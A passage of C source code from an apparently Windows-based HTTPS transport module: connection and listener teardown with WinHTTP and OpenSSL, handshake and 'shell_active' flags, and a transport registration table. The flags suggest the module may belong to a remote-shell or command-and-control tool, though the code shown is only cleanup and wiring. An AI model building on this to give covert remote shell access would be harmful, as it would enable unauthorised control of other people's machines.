    if (conn->mode == CONN_MODE_CLIENT) {
        if (conn->h_connect_send) WinHttpCloseHandle(conn->h_connect_send);
        if (conn->h_connect_recv) WinHttpCloseHandle(conn->h_connect_recv);
        if (conn->h_connect_hs)   WinHttpCloseHandle(conn->h_connect_hs);
        if (conn->h_session)      WinHttpCloseHandle(conn->h_session);
        DeleteCriticalSection(&conn->send_lock);
        DeleteCriticalSection(&conn->recv_lock);
    } else {
        if (conn->ssl) {
            SSL_shutdown(conn->ssl);
            SSL_free(conn->ssl);
            conn->ssl = NULL;
        }
        if (conn->srv_hs_event) CloseHandle(conn->srv_hs_event);
        sfq_destroy(&conn->srv_rx_q);
        sfq_destroy(&conn->srv_tx_q);
        if (conn->fd != INVALID_SOCKET) closesocket(conn->fd);
    }
    free(conn);
}
 
static void https_close_listener(int listener_fd)
{
    SOCKET s = (SOCKET)(INT_PTR)listener_fd;
    SrvListenerState *ls = find_srv_listener(s);
    if (ls) {
        ls->running = 0;
        CloseHandle(ls->new_conn_event);
    }
    closesocket(s);
 
    /* Free SSL_CTX */
    ensure_ssl_mu();
    EnterCriticalSection(&g_ssl_ctx_mu);
    if (g_ssl_ctx) {
        SSL_CTX_free(g_ssl_ctx);
        g_ssl_ctx = NULL;
    }
    LeaveCriticalSection(&g_ssl_ctx_mu);
}
 
void https_set_hs_mode(transport_conn_t *conn, int enabled)
{
    if (conn && conn->mode == CONN_MODE_CLIENT) {
        conn->is_hs_mode = enabled;
        if (!enabled) conn->hs_pub_ready = 0;
    }
}
 
void https_set_shell_active(transport_conn_t *conn, int active)
{
    if (conn && conn->mode == CONN_MODE_CLIENT)
        conn->shell_active = active;
}
 
/* ==========================================================================
 * Transport registration
 * ======================================================================= */
transport_t TRANSPORT_HTTPS = {
    .name           = "https",
    .listen         = https_listen,
    .connect        = https_connect,
    .accept         = https_accept,
    .send           = https_send,
    .recv           = https_recv,
    .poll           = https_poll,
    .close          = https_close,
    .close_listener = https_close_listener,
    .get_fd         = https_get_fd,
};